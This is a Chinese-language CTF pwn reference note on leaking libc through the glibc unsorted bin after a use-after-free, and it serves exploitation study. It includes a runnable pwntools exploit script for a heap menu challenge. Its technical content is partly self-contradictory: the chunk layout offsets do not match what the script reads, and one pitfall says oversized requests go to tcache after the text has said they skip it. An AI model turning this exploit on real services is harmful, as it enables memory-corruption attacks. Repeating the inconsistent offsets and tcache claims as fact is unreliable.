---
title: unsorted bin 泄露 libc（2.23 ~ 2.35 通用）
category: pwn
tags: [unsorted bin, libc泄露, main_arena, UAF, 堆]
signals: [chunk 大小大于 0x408 会跳过 tcache, UAF show 能读出乱码地址, 只能泄露不能写, 题目 libc 给了但 heap 地址未知, 需要先拿 libc base 再打]
difficulty: medium
source: "CTF-Wiki Unsorted Bin Attack / how2heap / ir0nstone"
tools: [pwntools, gdb, pwndbg, glibc-all-in-one]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 菜单堆题，`add` 允许申请 `0x410` 以上的大块（超过 tcache 上限 `0x408`）。
- `del` 之后还有 `show`，打印出来是 `\x7f` 开头的 6 字节（`0x7f....`）——**这就是 libc 地址**。
- 题目需要 libc base，但整个程序没有任何 `printf("%s")` 的任意地址读。
- `checksec` 常是 Full RELRO + PIE，逼你先泄露再打。
- 题目给的 libc 版本已知，但堆基址未知（要额外泄露 heap）。

## 二、原理

当一个 chunk 被 `free` 且**不满足 fastbin/tcache 条件**时，会进入 unsorted bin（双向链表）。此时 glibc 会：

```c
// _int_free 中，放入 unsorted 前
bck = unsorted_chunks(av);          // = &main_arena.bins[0] - 0x10
fwd = bck->fd;
p->fd = fwd;
p->bk = bck;
```

于是 **chunk 的 user data 前 16 字节被写入 libc 内部地址**：

```text
+0x00 chunk size
+0x08 fd → &main_arena.bins[0] - 0x10  (即 main_arena + 0x60 附近，随版本变)
+0x10 bk → &main_arena.bins[0] - 0x10
+0x18 user data（原内容）
```

UAF 读 `+0x08` 就拿到 `main_arena + offset`，减掉已知 offset 得到 libc base。

**各版本 main_arena 到 unsorted fd 的偏移**（64 位，取决于 `main_arena` 在 libc 中的符号位置）：

```python
# 最稳的做法：直接用 libc 符号算，不要背偏移
offset = libc.sym["main_arena"] + 0x60   # 常规布局下 fd 落在 main_arena+0x60
# 或者泄露两个不同大小 chunk 的 fd/bk，交叉验证
```

**注意**：glibc 2.31 之后 `main_arena` 不再是导出符号，pwntools 的 `libc.sym['main_arena']` 可能消失。此时用「泄露值低 12 位」去 `libc-database` 反查，或用 `libc.sym['__malloc_hook'] + 0x10 + 96` 近似（2.23~2.31 常用）。

## 三、checksec 判读与利用思路

```text
RELRO: Full  Canary: found  NX: enabled  PIE: enabled
```

三阶段利用：

1. **拿 libc**：
   - 申请 `0x410` chunk（`malloc(0x4f0)` 之类），`free` 它 → 进 unsorted。
   - 再申请一个 `0x410` 但**不写内容**，让 glibc 把 unsorted 中的块切分（`remainder` 又回 unsorted）。
   - `show` 那个已 free 的块，读 `fd`。
2. **拿 heap（2.32+ 必需）**：紧邻 unsorted chunk 的前面再放一块，UAF show 读出 fd 后与 `bk` 比较；或从 tcache chunk 的 mangled `next` 反推。
3. **打**（见 tcache / FSOP 篇）。

**unsorted bin attack**（2.28 前）：`free` 后写 `bk` 可让 `unsorted_chunks(av)->bk = p`，实现「往任意地址写一个 libc 地址」，常用于把 `global_max_fast` 改大或改 `_IO_list_all`（House of Orange）。**2.29+ 已加检查**，`bk` 必须指向合法 chunk，基本失效。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE else process()

# ---------- 菜单封装（按题目调整） ----------
def add(size, data=b""):
    p.sendlineafter(b"> ", b"1"); p.sendlineafter(b"size", str(size).encode())
    p.sendafter(b"data", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2"); p.sendlineafter(b"idx", str(idx).encode())

def show(idx):
    p.sendlineafter(b"> ", b"4"); p.sendlineafter(b"idx", str(idx).encode())
    return p.recvline()

# ---------- libc 泄露：绕开 tcache 与 fastbin ----------
BIG = 0x4f0        # 请求值；实际 chunk size = 0x4f0 + 0x10 = 0x500 > 0x408

def leak_libc():
    """经典三块布局：guard / victim / guard，free victim 进 unsorted"""
    for _ in range(4):
        add(0x80, b"/bin/sh\x00")            # 先用小块把 tcache 填满，避免 victim 被 tcache 接走
    v = None
    add(0x80, b"A")                          # idx0 guard
    add(BIG, b"B")                           # idx1 victim
    add(0x80, b"C")                          # idx2 guard，防止合并到 top
    delete(1)                                # victim -> unsorted
    data = show(1)                           # UAF 读 fd
    leak = u64(data[:8].ljust(8, b"\x00"))
    log.success(f"unsorted fd leak = {hex(leak)}")
    return leak

# ---------- 推算 libc base ----------
def libc_base_from_leak(leak):
    cands = []
    # 方案 1：2.23 ~ 2.31，main_arena 与 __malloc_hook 的相对关系
    if "__malloc_hook" in libc.sym:
        for delta in (0x60, 0x68, 0x70):     # 不同版本略有差异
            base = leak - (libc.sym["__malloc_hook"] + 0x10 + delta)
            if base & 0xfff == 0:
                cands.append(base)
    # 方案 2：直接用 main_arena 符号（若 libc 里还有）
    if "main_arena" in libc.sym:
        cands.append(leak - (libc.sym["main_arena"] + 0x60))
    # 方案 3：用低 12 位反查 libc-database
    cands = [c for c in cands if c & 0xfff == 0]
    if not cands:
        log.warning(f"无法直接推算，用 libc-database 按 {hex(leak)[-3:]} 反查")
    return cands[0] if cands else None

# ---------- 利用链入口 ----------
def exp(p):
    leak = leak_libc()
    base = libc_base_from_leak(leak)
    assert base, "libc base 推算失败"
    libc.address = base
    success(f"libc base = {hex(base)}  system = {hex(libc.sym['system'])}")
    # 后续：2.31 打 __free_hook；2.34+ 打 _IO_2_1_stdout_（见对应篇章）
    return libc

if __name__ == "__main__":
    p = start()
    exp(p)
    p.interactive()
```

gdb 里确认 unsorted 链上的指针（最快核对 offset）：

```bash
gdb -q ./pwn -ex 'b malloc' -ex r -ex c -ex 'p/x &main_arena'
# 手动 free 一块 0x500 后：
#   x/4gx <chunk_addr>   → 看 +8 / +16 是否指向 main_arena 附近
```

## 五、常见坑 / 变体

- **被 tcache 抢走**：`0x4f0` 请求在 2.26+ 会先看 tcache；tcache 满了（7 个）才进 unsorted。泄露前先用同尺寸块填满。
- **与 top chunk 合并**：victim 后面必须有 guard 块（处于 in-use），否则 free 时合并进 top，`fd/bk` 就没了。
- **`main_arena` 偏移随版本变**：不要背 `0x3ebc40` 这类硬编码；用 `libc.sym` 或 libc-database 反查低 12 位。
- **2.29+ unsorted bin attack 失效**：`bk` 合法性检查会 abort（`unsorted_chunks(av)->bk->fd != unsorted_chunks(av)`），泄露仍可做，写攻击改用 `large bin attack`。
- **泄露只有 6 字节**：`show` 用 `printf %s` 会在 `\x00` 截断，`recvline()` 后 `ljust(8, b"\x00")` 补齐。
- **`recv` 到换行**：libc 地址中若含 `\x0a`（换行）会提前截断，此时改用 `%p` 输出或多次尝试。

## 六、参考来源

- [CTF-Wiki: Unsorted Bin Attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/)
- [CTF-Wiki: 堆概述（bin 结构）](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-overview/)
- [CTF-Wiki: Tcache attack（libc leak 小节）](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/)
- [how2heap 仓库（unsorted bin 相关 demo）](https://github.com/shellphish/how2heap)
- [ir0nstone: Bins 与释放流程](https://ir0nstone.gitbook.io/notes/binexp/heap/bins/chunk-allocation-and-reallocation)
- [glibc malloc.c 源码](https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c)
- [libc.rip 反查](https://libc.rip/)
